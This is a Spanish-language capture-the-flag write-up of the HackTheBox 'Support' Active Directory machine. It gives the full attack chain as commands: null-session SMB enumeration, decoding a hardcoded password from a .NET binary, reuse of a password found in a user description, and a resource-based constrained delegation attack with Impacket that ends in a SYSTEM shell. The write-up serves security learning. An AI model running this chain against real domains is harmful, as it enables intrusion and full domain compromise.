# Support - HackTheBox

**Fecha de resolución:** 26 de septiembre de 2026

Máquina Windows Active Directory, IP 10.129.62.134, dominio `support.htb`, controlador de dominio `DC`.

## Reconocimiento

Escaneo completo de puertos:

```
nmap --privileged -n -p- -sS --min-rate 5000 -vvv -oG allPorts 10.129.62.134
```

Puertos típicos de un DC: 53 (DNS), 88 (Kerberos), 135/139/445 (RPC/SMB), 389/636/3268/3269 (LDAP/LDAPS/GC), 464 (kpasswd), 593 (RPC sobre HTTP), 5985 (WinRM) y 9389 (ADWS), más varios puertos RPC altos. Escaneo de versiones sobre esos puertos:

```
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49674,49685,49702 10.129.62.134 -sS -n -vvv -sCV -oN targets
```

Confirma el dominio `support.htb` y el nombre del DC (`DC`), Windows Server 2022.

## SMB con sesión nula

```
nxc smb 10.129.62.134
nxc smb 10.129.62.134 -u 'guest' -p ''
```

El servidor acepta autenticación nula (`Null Auth:True`) y la cuenta `guest` conecta sin contraseña. Enumero shares:

```
nxc smb 10.129.62.134 -u 'guest' -p '' --shares
```

Además de los shares administrativos por defecto hay uno propio, `support-tools`, con permiso de lectura. Entro con `smbclient.py` de Impacket:

```
smbclient.py guest@10.129.62.134
use support-tools
ls
get SysinternalsSuite.zip
get UserInfo.exe.zip
```

El share contiene varias herramientas portables (7-Zip, Notepad++, PuTTY, WinDirStat, Wireshark, SysinternalsSuite) y un ejecutable propio, `UserInfo.exe`. Descargo `SysinternalsSuite.zip` pero no aporta nada útil, es la suite de Microsoft sin modificar. El binario interesante es `UserInfo.exe`.

## Ingeniería inversa de UserInfo.exe

```
file UserInfo.exe
```

Es un ejecutable .NET (Mono/.NET assembly). Antes de tirar de `strings` pruebo herramientas de desensamblado que no tengo instaladas en el sistema: `ghidra`, `cutter` e `ilspy`/`ilspycmd` no están disponibles (ni siquiera en el repo de apt como paquete instalado). En vez de instalar un decompilador completo para un binario pequeño, uso `strings` directamente:

```
strings UserInfo.exe
```

La salida en ASCII muestra símbolos de un `.cctor`/`Program` que usa `DirectorySearcher` contra LDAP, con campos `enc_password` y `getPassword`, y referencias a `FromBase64String`/`GetString`: el programa trae una contraseña de servicio cifrada embebida en el binario. Repito la extracción en UTF-16LE, que es donde vive la cadena real:

```
strings -el UserInfo.exe
```

Aparecen dos cadenas sueltas: `0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E` (el valor de `enc_password`) y, un poco más abajo, `armando`. Pruebo lo obvio primero:

```
echo '0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E' | base64 -d
```

No da texto legible, solo bytes binarios: no es una contraseña en Base64 sin más, `getPassword()` hace algo más con esos bytes antes de devolver el valor real. Busco un decompilador .NET online, `decompiler.com`, y le subo `UserInfo.exe`. Ahí aparece el cuerpo completo de la clase `Protected` con `enc_password` y la cadena `armando` como `key`: el método decodifica primero en Base64 y luego recorre cada byte haciendo XOR con la key (repitiéndola cíclicamente) y un segundo XOR contra la constante `0xDF`. Copio esa misma lógica y la pego en `dotnetfiddle.net` para compilarla y ejecutarla directamente en el navegador contra la cadena embebida, sin tener que reescribirla a mano en Python. La ejecución imprime la contraseña en claro: `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`. Es la contraseña de la cuenta de servicio LDAP que usa `UserInfo.exe` para consultar el directorio.

## Enumeración autenticada como ldap

Compruebo que la credencial vale para una cuenta de dominio real:

```
nxc ldap 10.129.62.134 -u 'guest' -p '' --users
```

Antes de dar con el rid-brute completo, un primer intento con `--ri` (autocompletado a medias) da error de uso; repito el flag entero:

```
nxc smb 10.129.62.134 -u 'guest' -p '' --rid-brute
```

El rid-brute por sesión nula lista todos los usuarios del dominio: `ldap`, `support`, y una docena de cuentas con formato `apellido.nombre` (smith.rosario, hernandez.stanley, wilson.shelby, anderson.damian, thomas.raphael, levine.leopoldo, raven.clifton, bardot.mary, cromwell.gerard, monroe.david, west.laura, langley.lucy, daughtler.mabel, stoll.rachelle, ford.victoria), además de un grupo no estándar, `Shared Support Accounts`. Guardo la lista limpia:

```
awk -F'\\' '{print $2}' users.txt | awk '{print $1}' > usuarios_limpios.txt
```

Antes de asumir que la contraseña sacada del binario es solo para `ldap`, la pruebo contra toda la lista de usuarios por varios protocolos:

```
nxc smb 10.129.62.134 -u usuarios_limpios.txt -p password.txt --continue-on-success
nxc winrm 10.129.62.134 -u usuarios_limpios.txt -p password.txt --continue-on-success
nxc ldap 10.129.62.134 -u usuarios_limpios.txt -p password.txt --continue-on-success
```

Solo autentica la cuenta `ldap`; contra el resto de usuarios falla en los tres protocolos. Con esa única credencial válida enumero política de contraseñas y SAM (ambos sin resultado relevante, la cuenta no tiene privilegios de lectura de SAM) y dumpeo el directorio completo:

```
nxc ldap 10.129.62.134 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --users
ldapdomaindump ldap://10.129.62.134 -u 'support.htb\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

## Contraseña en la descripción de support

Reviso los atributos `description` de las cuentas de usuario, que a veces se usan como bloc de notas informal:

```
nxc ldap 10.129.62.134 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -M get-desc-users
```

Las cuentas de sistema (Administrator, Guest, krbtgt) solo tienen las descripciones por defecto, pero el módulo valida directamente una credencial nueva contra el campo del usuario `support`: `support:Ironside47pleasure40Watchful`, en texto plano en la descripción de la cuenta. Confirmo la credencial por varios protocolos:

```
nxc ldap 10.129.62.134 -u support -p 'Ironside47pleasure40Watchful'
nxc smb 10.129.62.134 -u support -p 'Ironside47pleasure40Watchful'
nxc winrm 10.129.62.134 -u support -p 'Ironside47pleasure40Watchful'
```

El último confirma acceso interactivo (`Pwn3d!`): `support` tiene permiso de WinRM.

## Acceso inicial como support

```
evil-winrm -i 10.129.62.134 -u support -p 'Ironside47pleasure40Watchful'
```

`whoami` devuelve `support\support`. Flag de usuario en `C:\Users\support\Desktop\user.txt`.

## BloodHound: de support a RBCD sobre el DC

Con esta cuenta de dominio recolecto todos los datos de AD:

```
bloodhound-python -u 'support' -p 'Ironside47pleasure40Watchful' -d support.htb -ns 10.129.62.134 -dc dc.support.htb -c all
```

Cruzando la pertenencia a grupos, `support` es miembro directo del grupo `Shared Support Accounts`, y ese grupo tiene `GenericAll` sobre el objeto de equipo del propio controlador de dominio (`DC`). Control total sobre el objeto de equipo del DC permite escribir su atributo `msDS-AllowedToActOnBehalfOfOtherIdentity`, es decir, montar un ataque de Resource-Based Constrained Delegation (RBCD) contra el DC.

## RBCD contra el DC

El ataque necesita una cuenta de equipo bajo mi control. Por cuota de máquina por defecto, cualquier usuario del dominio puede crear una:

```
addcomputer.py support.htb/support:'Ironside47pleasure40Watchful' -computer-name 'ATTACKPC$' -computer-pass 'Password123!' -dc-ip 10.129.62.134
```

Con `ATTACKPC$` creada, configuro delegación RBCD para que pueda actuar en nombre de otros usuarios frente al DC, aprovechando el `GenericAll` de `Shared Support Accounts`:

```
rbcd.py support.htb/support:'Ironside47pleasure40Watchful' -delegate-to 'DC$' -delegate-from 'ATTACKPC$' -action 'write' -dc-ip 10.129.62.134
```

Con la delegación escrita, solicito un ticket de servicio impersonando a Administrator para el SPN `cifs/dc.support.htb` mediante S4U2Self + S4U2Proxy:

```
getST.py support.htb/ATTACKPC\$:'Password123!' -spn 'cifs/dc.support.htb' -impersonate 'Administrator' -dc-ip 10.129.62.134
```

Se guarda el ticket como `Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache`.

## Escalada a SYSTEM

```
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

El ticket obtenido tiene SPN `cifs/dc.support.htb`, así que solo es válido contra ese nombre exacto. Los dos primeros intentos de `psexec.py` fallan por eso, Kerberos rechaza el ticket porque el nombre usado para conectar no coincide con el del SPN:

```
psexec.py Administrator@10.129.62.134 -k -no-pass
psexec.py Administrator@support.htb -k -no-pass
```

Ambos devuelven `KDC_ERR_PREAUTH_FAILED`. Repito contra el nombre exacto del SPN:

```
psexec.py Administrator@dc.support.htb -k -no-pass
```

Esta vez sube el ticket, monta el servicio remoto y abre una shell como `nt authority\system`. Flag de root en `C:\Users\Administrator\Desktop\root.txt`.

---

- GitHub: [github.com/germanvegaa](https://github.com/germanvegaa)
- TryHackMe: [tryhackme.com/p/G3RM4N](https://tryhackme.com/p/G3RM4N)
- HackTheBox: [app.hackthebox.com/public/users/3990132](https://app.hackthebox.com/public/users/3990132)
